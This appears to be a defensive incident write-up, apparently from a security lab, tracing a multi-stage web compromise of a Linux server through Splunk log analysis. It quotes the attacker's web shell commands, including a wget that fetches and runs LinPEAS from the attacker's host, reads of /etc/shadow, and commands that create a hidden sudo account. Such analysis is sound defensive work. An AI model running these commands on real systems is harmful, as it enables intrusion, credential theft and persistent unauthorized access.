# Web Attack Investigation

## Overview

This section documents the investigation of malicious web activity targeting the Linux server `brightstar-web`.

Analysis of the Apache `access.log` identified a multi-stage attack originating from `172.16.20.99`. The attacker progressed from active reconnaissance and vulnerability scanning to a credential attack against the administrative login portal, followed by administrative access, PHP web shell deployment, remote command execution, system discovery, sensitive file discovery, and the transfer and execution of LinPEAS.

The investigation was performed in Splunk by analyzing HTTP requests, response codes, User-Agent values, requested URIs, command parameters, timestamps, and correlations with other log sources.

---

## 1. Initial Reconnaissance — Nmap

At approximately `08:25`, activity from `172.16.20.99` was identified with the following User-Agent:

`Mozilla/5.0 (compatible; Nmap Scripting Engine; ...)`

The attacker probed multiple web resources, including:

- `/robots.txt`
- `/sitemap.xml`
- `/.git/HEAD`
- `/HNAP1`
- `/evox/about`
- `/sdk`

Multiple HTTP methods were also observed, including `POST`, `PROPFIND`, and `OPTIONS`.

### Analyst Assessment

The activity is consistent with active reconnaissance performed using the Nmap Scripting Engine. The attacker was attempting to identify exposed resources, supported HTTP methods, configuration weaknesses, and potentially sensitive files.

**Confidence:** High

---

## 2. Vulnerability Scanning — Nikto

At approximately `08:30`, the attacker began scanning the web server using Nikto, identified by the User-Agent:

`Mozilla/5.0 (Nikto/2.5.0)`

The scan identified several accessible resources:

| Resource | HTTP Status | Analytical Significance |
|---|---:|---|
| `/admin/login` | 200 | Administrative authentication portal |
| `/phpinfo.php` | 200 | May expose PHP and server configuration information |
| `/phpmyadmin/` | 200 | Database administration interface |
| `/uploads/` | 200 | Accessible upload-related directory |
| `/server-status` | 403 | Resource appears to exist, but access is forbidden |
| `/.htpasswd` | 403 | Potentially sensitive authentication file protected from access |

### Analyst Assessment

The Nikto scan provided the attacker with information about exposed administrative and potentially sensitive resources. The discovery of `/admin/login` was particularly significant because this endpoint was later targeted in a credential attack.

**Confidence:** High

---

## 3. Directory Enumeration — Gobuster

At approximately `08:35`, activity associated with Gobuster was observed from the same attacker IP.

The User-Agent was identified as:

`gobuster/3.6`

Discovered or tested resources included:

- `/admin`
- `/api`
- `/uploads`
- `/login`
- `/dashboard`
- `/profile`
- `/search`
- `/phpmyadmin`

### Analyst Assessment

The attacker used directory enumeration to map the structure of the web application and identify additional endpoints that could potentially be used for authentication, administration, file upload, or further exploitation.

**Confidence:** High

---

## 4. Credential Attack Against the Administrative Portal

At `08:40:01`, a rapid sequence of POST requests was observed against:

`/admin/login`

The requests used the following User-Agent:

`Mozilla/5.0 (Hydra)`

Multiple requests initially returned:

`401 Unauthorized`

At `08:40:14`, a request returned:

`200 OK`

Subsequent activity from the same source IP included access to administrative resources.

### Evidence Summary

The observed sequence was:

`Repeated 401 responses → HTTP 200 response → Access to administrative pages`

### Analyst Assessment

The transition from repeated authentication failures to an HTTP `200` response, followed by successful access to administrative resources, strongly indicates that the credential attack successfully compromised an administrative account.

While an HTTP `200` response alone would not be sufficient to prove successful authentication, the subsequent administrative activity provides additional supporting evidence.

**Confidence:** High

---

## 5. Administrative Access

Following the suspected successful credential attack, the attacker accessed multiple administrative resources:

- `/admin/dashboard`
- `/admin/settings`
- `/admin/users`
- `/admin/upload`

This activity originated from the same attacker IP, `172.16.20.99`.

### Analyst Assessment

The sequence of events strongly supports successful administrative access following the Hydra credential attack.

The `/admin/upload` endpoint became particularly important because it was immediately followed by the appearance of a PHP file in the uploads directory.

**Confidence:** High

---

## 6. PHP Web Shell Deployment

The attacker submitted a POST request to:

`/admin/upload`

Shortly afterward, requests were observed to:

`/uploads/shell.php`

The attacker then passed operating system commands through the `cmd` URL parameter.

Examples included:

`/uploads/shell.php?cmd=id`

`/uploads/shell.php?cmd=whoami`

`/uploads/shell.php?cmd=uname%20-a`

### Analyst Assessment

The sequence strongly indicates that the attacker uploaded and successfully interacted with a PHP web shell, achieving remote command execution on the compromised Linux server.

This represented a major escalation in the incident: the attacker moved from access to the web application's administrative interface to executing operating system commands remotely.

**Confidence:** High

---

## 7. Post-Exploitation System Discovery

After deploying the web shell, the attacker performed extensive system enumeration.

Observed commands included:

| Command | Purpose |
|---|---|
| `id` | Identify the current user and group memberships |
| `whoami` | Identify the current execution context |
| `uname -a` | Gather operating system and kernel information |
| `cat /etc/passwd` | Enumerate local user accounts |
| `cat /etc/shadow` | Attempt to access password hashes |
| `ls -la /var/www/html` | Enumerate web application files |
| `cat /var/www/html/config.php` | Attempt to access application configuration |
| `netstat -tlnp` | Identify listening ports and network services |
| `ps aux` | Enumerate running processes |
| `ifconfig` | Gather network configuration information |

### Analytical Note: `/etc/shadow`

A request to execute:

`cat /etc/shadow`

returned an HTTP `200` response.

However, an HTTP `200` response only confirms that the web application successfully returned an HTTP response. The available Apache access log does not contain the response body and therefore does not independently prove that the contents of `/etc/shadow` were successfully retrieved.

### Analyst Assessment

The activity represents systematic post-exploitation discovery involving users, system information, network configuration, running processes, application files, and credential-related resources.

**Confidence:** High for the command attempts; Medium for successful retrieval of `/etc/shadow` through the web shell.

---

## 8. Sensitive File Discovery

The attacker searched the filesystem for sensitive files using commands including:

`find / -name *.sql -type f`

`find / -name *.pem -type f`

The attacker subsequently requested:

`cat /var/backups/customer_db.sql`

The corresponding HTTP response size was:

`45,102 bytes`

Later in the investigation, `vsftpd.log` confirmed the successful download of the same file with an identical size of `45,102 bytes`.

### Cross-Source Correlation

The sequence was:

**SQL File Discovery → Database Access → FTP Exfiltration**

This represents a strong correlation between the Apache access logs and FTP server logs.

### Analyst Assessment

The attacker actively searched for database backups and private key files. The correlation involving `customer_db.sql` demonstrates a clear progression from discovery to access and ultimately confirmed exfiltration.

**Confidence:** High

---

## 9. LinPEAS Transfer and Execution

At `08:50:01`, the attacker executed:

`wget http://172.16.20.99:8080/linpeas.sh -O /tmp/linpeas.sh`

At `08:50:08`:

`chmod +x /tmp/linpeas.sh`

At `08:50:15`:

`bash /tmp/linpeas.sh`

### Analyst Assessment

The attacker transferred LinPEAS from infrastructure at `172.16.20.99:8080`, assigned execution permissions, and executed the script.

LinPEAS is commonly used to enumerate Linux systems for potential privilege escalation paths, exposed credentials, misconfigurations, sensitive files, and other security weaknesses.

The available logs confirm execution of the script but do not show exactly which findings, if any, contributed to the later compromise of the `developer` account or root access.

**Confidence:** High for transfer and execution; unconfirmed regarding its role in subsequent privilege escalation.

---

## 10. Web-Based Persistence Commands

Later in the attack, commands were sent through the web shell to create a new local account:

`useradd -m -s /bin/bash svc_monitor`

A password was then assigned:

`echo svc_monitor:[REDACTED] | chpasswd`

Finally, the account was added to the `sudo` group:

`usermod -aG sudo svc_monitor`

The Linux `auth.log` independently confirmed the creation of the account, password modification, and addition to the `sudo` group.

### Analyst Assessment

This represents privileged account creation for persistence. The use of the name `svc_monitor` may have been intended to resemble a legitimate service account.

The correlation between the web shell commands in `access.log` and the resulting operating system events in `auth.log` provides strong multi-source confirmation.

**Confidence:** Confirmed

---

## Key Web Investigation Findings

The web investigation established the following attack progression:

**Nmap Reconnaissance → Nikto Vulnerability Scanning → Gobuster Directory Enumeration → Hydra Credential Attack → Administrative Access → PHP Web Shell Deployment → Remote Command Execution → System Discovery → Sensitive File Discovery → LinPEAS Transfer and Execution → Persistence Commands**

The most significant findings were:

- Malicious activity originated from `172.16.20.99`.
- Multiple offensive security tools were identified through User-Agent values and command activity.
- The administrative login portal was subjected to a credential attack.
- Subsequent administrative access strongly indicated successful compromise.
- A PHP web shell named `shell.php` was deployed.
- The attacker achieved remote command execution.
- Extensive system and sensitive-file discovery followed.
- LinPEAS was transferred and executed.
- Commands for creating a privileged persistence account were observed and independently confirmed by authentication logs.

---

## Splunk Investigation Evidence

The following evidence should be documented with Splunk screenshots and the corresponding SPL queries:

1. Identification of activity from `172.16.20.99`.
2. Nmap User-Agent activity.
3. Nikto scanning and discovered resources.
4. Gobuster directory enumeration.
5. Hydra requests showing repeated `401` responses followed by `200`.
6. Administrative page access.
7. Upload and execution of `/uploads/shell.php`.
8. Commands executed through the web shell.
9. Sensitive file discovery.
10. LinPEAS transfer and execution.
11. Persistence commands involving `svc_monitor`.

> Screenshots and SPL queries should reflect the actual investigation performed in Splunk and should not be fabricated or reconstructed solely for presentation.

---

## Final Assessment

The Apache access logs demonstrate a successful multi-stage web compromise originating from `172.16.20.99`.

The attacker progressed from automated reconnaissance and vulnerability scanning to a credential attack against the administrative interface. Following successful administrative access, a PHP web shell was deployed, enabling remote operating system command execution.

The attacker then performed extensive post-exploitation discovery, searched for sensitive files, accessed a customer database backup, transferred and executed LinPEAS, and issued commands to establish persistence through a new privileged local account.

The web attack served as the primary foundation for the broader compromise, which later included successful SSH access, root privilege escalation, FTP-based data exfiltration, and persistent account creation.
